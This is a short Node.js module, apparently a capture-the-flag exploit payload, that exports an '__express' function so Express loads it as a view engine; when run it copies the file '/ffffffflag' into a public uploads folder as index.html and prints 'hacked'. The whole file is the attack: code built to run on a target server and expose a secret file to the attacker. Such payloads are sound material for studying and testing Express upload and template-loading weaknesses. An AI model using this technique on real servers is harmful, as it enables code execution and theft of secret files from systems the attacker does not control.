const fs = require("fs");

const __express = () => {
  fs.copyFileSync("/ffffffflag", "/app/uploads/index.html");
  console.log("hacked");
};

module.exports = {
  __express,
};
